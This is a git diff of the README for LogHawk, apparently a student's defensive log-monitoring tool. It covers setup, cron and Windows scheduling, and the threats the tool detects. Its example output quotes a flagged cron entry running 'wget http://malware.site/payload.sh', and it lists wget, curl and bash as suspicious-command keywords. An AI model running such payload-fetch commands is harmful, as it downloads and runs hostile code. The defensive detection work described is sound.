@@ -1,97 +1,101 @@
 
 # 🦅 LogHawk
 
-**LogHawk** is a lightweight log monitoring tool for detecting early indicators of security threats. It scans system and application logs for:
+LogHawk is a lightweight, open-source log monitoring tool built in both Python and Bash. It automates the detection of suspicious activity in system and web logs, helping security teams identify threats like brute-force attacks, critical errors, and malicious scripts before they become incidents. It scans system and application logs for:
 
 - 🛑 Failed login attempts
 - ⚠️ Unusual traffic spikes
 - 🔥 Critical system errors
 - 🦠 Suspicious script activity
 
----
 
-## 📌 Getting Started
+## ⚙️ Installation
+Before using LogHawk, make sure you have Python 3 installed. You can install it by running: 
 
-### 1. Clone the Repository
-
-bash
-git clone https://github.com/YOUR-USERNAME/LogHawk.git
+```bash
+sudo apt-get install python3
+```
+Clone the repo and make scripts executable:
+```bash
+git clone https://github.com/Lintageorge7/LogHawk.git
 cd LogHawk
-
-### 2. Make Scripts Executable
-
 chmod +x loghawk.sh
-
+chmod +x loghawk.py
+```
 ## 🐍 Usage (Python)
 
-
-python3 loghawk.py /path/to/logfile.log
-
+```bash
+python3 loghawk.py Sample_logs/auth.log
+```
 
 ## 📤 Example Output
-
-[🔐] 6 failed login attempts from 192.168.1.101
-
-[🌐] High traffic from 10.0.0.55: 214 requests
-
-[🔥] ERROR at 13:24:45: Disk quota exceeded
-
-[🦠] Suspicious activity: curl download detected in cron job
-
+```bash
+[🔐] Detecting failed logins...
+⚠️  6 failed login attempts from 192.168.1.101
+[🌐] Detecting traffic spikes...
+[🔥] Detecting system errors...
+❗ Jul 14 08:14:30 systemd[1]: ERROR - Disk full
+❗ Jul 14 08:14:45 app[1001]: CRITICAL - Kernel panic
+[🦠] Detecting suspicious script activity...
+🚩 Suspicious: Jul 14 08:14:01 cron[5678]: (root) CMD (wget http://malware.site/payload.sh)
+```
 
 ## 💻 Usage (Bash)
+```bash
+./loghawk.sh Sample_logs/system.log
+```
 
-./loghawk.sh /path/to/logfile.log
+## 📸 Sample Output Screenshot
+
+
+## 🧠 Threats Detected
+LogHawk currently detects:
+
+ • 🔐 Failed Login Attempts — Flags 5+ failed logins per IP (MITRE T1110)
+
+ • 🔥 Critical System Errors — Catches “ERROR” and “CRITICAL” entries in logs
+
+ • 🦠 Suspicious Script Activity — Identifies malicious command use (wget, curl, bash)
+
+ • 🌐 Traffic Spikes — High request volume from single IPs (future iteration)
+
+All detections act as potential Indicators of Compromise (IoCs).
 
 ## ⏱️ Automation Setup
 
-Linux: Crontab
-
-To run LogHawk every 10 minutes:
-
+### 🐧 Linux (Cron)
+Run every 10 minutes:
+```bash
 crontab -e
-
-(replace with your full path):
-
-*/10 * * * * /full/path/to/loghawk.sh /var/log/auth.log
-
+*/10 * * * * /home/student/LogHawk/loghawk.sh /var/log/auth.log
+```
 
 ## 🪟 Windows: Task Scheduler
 
 To schedule LogHawk on Windows:
 
-1. Open Task Scheduler
+1. Open Task Scheduler → Create Basic Task
 
-2. Create a basic task:
+2. Trigger: Every 10 minutes
 
-    • Trigger: Every 10 minutes
+3. Action: Start a program
+    
+ •  Program: python
 
-    • Action: Start a program
-
-    • Program/script: python
-
-    • Add arguments: C:\path\to\loghawk.py C:\logs\access.log
-
-3. Save and test the task.
+ •  Arguments: C:\path\to\loghawk.py C:\logs\auth.log
 
 ## 📂 Project Structure
 
-
-bash
+```bash
 LogHawk/
 
-├── loghawk.py # Python version
-
-├── loghawk.sh # Bash version
-
-├── sample_logs/ # Test log files
-
-├── screenshots/ # Images for report/README
-
-├── README.md # This file
-
+├── loghawk.py        # Python version
+├── loghawk.sh        # Bash version
+├── sample_logs/      # Test log files
+├── screenshots/      # Images for report/README
+├── README.md         # This file
 └── LogHawk_Report.md # Final report (optional: .pdf)
-
+```
 
 ## 🧪 Sample Logs
 
@@ -105,35 +109,31 @@ Sample logs are located in the sample_logs/ folder for testing:
 
 
 ## 🔄 Future Improvements
+ 
+ • Email/SMS alerting
 
- • Add email alerting
- 
+ • Log filtering thresholds
+
  • JSON/CSV export
- 
+
  • Web UI dashboard
- 
- • Integration with Splunk or ELK Stack
+
+ • Integration with ELK or Splunk
 
 ## 📚 References
 
-MITRE ATT&CK: https://attack.mitre.org/ 
+ • MITRE ATT&CK: https://attack.mitre.org/ 
 
-NIST Log Management Guidelines: https://csrc.nist.gov/publications 
+ • NIST Log Management Guidelines: https://csrc.nist.gov/publications 
 
-Red Hat: Log Files and Monitoring: https://access.redhat.com  
+ • Red Hat: Log Files and Monitoring: https://access.redhat.com  
 
 ## 🤝 Contributing
-
-Pull requests are welcome! If you discover new threat patterns or want to improve the tool, feel free to contribute.
+Pull requests are welcome. If you have improvements or new detection rules, feel free to contribute!
 
 ## 📄 License
-
 This project is licensed under the MIT License.
 
-## 👨‍💻 Author
-
+## 👩‍💻 Author
 Linta Susan George
-
-Cybersecurity Student @ Lighthouse Labs
-
-🇨🇦 Canada
+Cybersecurity Student @ Lighthouse Labs | 🇨🇦
